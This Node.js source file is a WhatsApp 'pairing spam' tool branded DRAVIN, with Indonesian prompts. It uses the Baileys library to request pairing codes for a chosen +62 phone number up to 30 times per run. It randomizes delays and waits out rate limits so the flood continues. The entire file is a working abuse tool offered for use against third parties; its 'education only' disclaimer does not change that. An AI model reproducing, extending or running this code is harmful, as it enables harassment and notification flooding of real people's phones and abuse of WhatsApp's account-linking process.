const { default: makeWASocket, useMultiFileAuthState } = require("@whiskeysockets/baileys");
const figlet = require("figlet");
const gradient = require("gradient-string");
const chalk = require("chalk").default;
const readline = require("readline");
const pino = require("pino");

// Store original terminal settings
const originalStdinIsRaw = process.stdin.isRaw;

// Improved sleep function
const sleep = (ms, variation = 0) => new Promise(resolve => {
    setTimeout(resolve, ms + (variation ? Math.floor(Math.random() * variation) : 0));
});

// Fixed question function with proper input handling
const question = (text) => {
    return new Promise(resolve => {
        const rl = readline.createInterface({
            input: process.stdin,
            output: process.stdout,
            terminal: true
        });

        // Clear line and show prompt
        process.stdout.write('\x1B[K' + text);
        
        let input = '';
        const onData = (chunk) => {
            const str = chunk.toString();
            
            // Handle backspace
            if (str === '\b' || str === '\x7f') {
                if (input.length > 0) {
                    input = input.slice(0, -1);
                    process.stdout.write('\b \b');
                }
                return;
            }
            
            // Handle enter
            if (str === '\r' || str === '\n') {
                process.stdin.off('data', onData);
                process.stdout.write('\n');
                rl.close();
                resolve(input);
                return;
            }
            
            // Only allow printable characters
            if (str >= ' ' && str <= '~') {
                input += str;
                process.stdout.write(str);
            }
        };

        // Set up input handler
        if (process.stdin.isTTY) {
            process.stdin.setRawMode(true);
        }
        process.stdin.on('data', onData);
    });
};

// Specialized phone number question function
const questionPhoneNumber = async (text) => {
    while (true) {
        const input = await question(text);
        const cleaned = input.trim().replace(/\D/g, '');
        if (/^62\d{9,13}$/.test(cleaned)) {
            return cleaned;
        }
        console.log(chalk.red(`❌ Format nomor tidak valid (${cleaned.length} digit): ${cleaned}`));
        console.log(chalk.red("   Contoh valid: 6281234567890 (tanpa + atau spasi)"));
    }
};

// Specialized number range question function
const questionNumberRange = async (text, min, max) => {
    while (true) {
        const input = await question(text);
        const num = parseInt(input);
        if (!isNaN(num) && num >= min && num <= max) {
            return num;
        }
        console.log(chalk.red(`❌ Harap masukkan angka antara ${min} dan ${max}`));
    }
};

// Typewriter effect
const typeEffect = async (text, delay = 20) => {
    for (const char of text) {
        process.stdout.write(char);
        await sleep(delay);
    }
    process.stdout.write('\n');
};

// Banner display
const showBanner = async () => {
    console.clear();
    const banner = figlet.textSync("DRAVIN", { font: "ANSI Shadow" });
    console.log(gradient.instagram.multiline(banner));
    await typeEffect(chalk.magenta("[⚙️] WhatsApp Pairing Spam Tools v2 - DRAVIN Edition"));
    await typeEffect(chalk.cyan("═════════════════════════════════════════════════════"));
    await typeEffect(chalk.green("• Gunakan hanya untuk edukasi, tanggung sendiri risikonya"));
    await typeEffect(chalk.yellow("• Target hanya berlaku untuk nomor dengan kode negara 62"));
    await typeEffect(chalk.cyan("═════════════════════════════════════════════════════\n"));
};

// WhatsApp connection
async function initConnection() {
    const { state } = await useMultiFileAuthState('./dravin_session');
    return makeWASocket({
        logger: pino({ level: "silent" }),
        printQRInTerminal: false,
        auth: state,
        connectTimeoutMs: 60000,
        defaultQueryTimeoutMs: 0,
        keepAliveIntervalMs: 10000,
        emitOwnEvents: true,
        fireInitQueries: true,
        generateHighQualityLinkPreview: true,
        syncFullHistory: true,
        markOnlineOnConnect: true,
        browser: ["Ubuntu", "Chrome", "20.0.04"]
    });
}

// Main spam function
async function startSpam() {
    const conn = await initConnection();
    let lastNumber = '';

    while (true) { 
        console.log(chalk.cyan("\n💡 Masukkan nomor target dan jumlah spam"));
        
        // Get phone number
        const nomor = await questionPhoneNumber(
            chalk.cyan(' ┌─╼') + chalk.red('[DRAVIN') + chalk.hex('#FFA500')('〄') + chalk.red('TOOLS]') + '\n' +
            chalk.cyan(' └────╼') + ' ' + chalk.red('❯') + chalk.hex('#FFA500')('❯') + chalk.blue('❯') + ' ' +
            chalk.yellow('Nomor Target (62xxxxxxxxxx): ')
        );
        lastNumber = nomor;

        // Get spam count
        const jumlah = await questionNumberRange(
            chalk.cyan(' ┌─╼') + chalk.red('[DRAVIN') + chalk.hex('#FFA500')('〄') + chalk.red('TOOLS]') + '\n' +
            chalk.cyan(' └────╼') + ' ' + chalk.red('❯') + chalk.hex('#FFA500')('❯') + chalk.blue('❯') + ' ' +
            chalk.yellow("Jumlah Spam (1-30): "),
            1, 30
        );

        console.log(chalk.green(`\n🚀 Memulai spam pairing ke ${nomor} sebanyak ${jumlah}x...\n`));
        
        let sukses = 0;
        for (let i = 0; i < jumlah; i++) {
            try {
                const start = Date.now();
                let kode = await conn.requestPairingCode(nomor);
                kode = kode.match(/.{1,4}/g).join('-');
                const waktu = ((Date.now() - start) / 1000).toFixed(2);
                console.log(chalk.green(`[✓] ${i + 1}/${jumlah} => Kode: ${chalk.yellow(kode)} (${waktu}s)`));
                sukses++;
                await sleep(500, 500);
            } catch (err) {
                console.log(chalk.red(`[X] ${i + 1}/${jumlah} => Gagal: ${err.message}`));
                if (err.message.includes("rate limit") || err.message.includes("too many")) {
                    console.log(chalk.yellow("⚠️ Terlalu banyak permintaan, menunggu 45 detik..."));
                    await sleep(45000);
                } else {
                    await sleep(500, 500);
                }
            }
        }

        console.log(chalk.cyan("\n📊 Ringkasan"));
        console.log(chalk.cyan(`├─ Nomor : ${chalk.white(nomor)}`));
        console.log(chalk.cyan(`├─ Total : ${chalk.white(jumlah)}`));
        console.log(chalk.cyan(`├─ Sukses : ${chalk.green(sukses)}`));
        console.log(chalk.cyan(`└─ Gagal : ${chalk.red(jumlah - sukses)}`));

        const ulang = await question(
            chalk.cyan(' ┌─╼') + chalk.red('[DRAVIN') + chalk.hex('#FFA500')('〄') + chalk.red('TOOLS]') + '\n' +
            chalk.cyan(' └────╼') + ' ' + chalk.red('❯') + chalk.hex('#FFA500')('❯') + chalk.blue('❯') + ' ' +
            chalk.magenta("🔁 Ingin spam lagi? (y/n): ")
        );
        if (ulang.toLowerCase() !== "y") break;
    }

    // Restore terminal settings
    if (process.stdin.isTTY) {
        process.stdin.setRawMode(originalStdinIsRaw);
    }
    console.log(chalk.green("\n✨ Terima kasih telah menggunakan Dravin Tools!"));
    process.exit(0);
}

// Export the start function
module.exports = {
  start: async () => {
    try {
        await showBanner();
        await sleep(1000);
        await typeEffect(chalk.yellow("[⌛] Menyiapkan koneksi..."));
        await sleep(1500);
        await startSpam();
    } catch (error) {
        // Ensure terminal settings are restored on error
        if (process.stdin.isTTY) {
            process.stdin.setRawMode(originalStdinIsRaw);
        }
        console.error(chalk.red(`Error: ${error.message}`));
        process.exit(1);
    }
  }
};
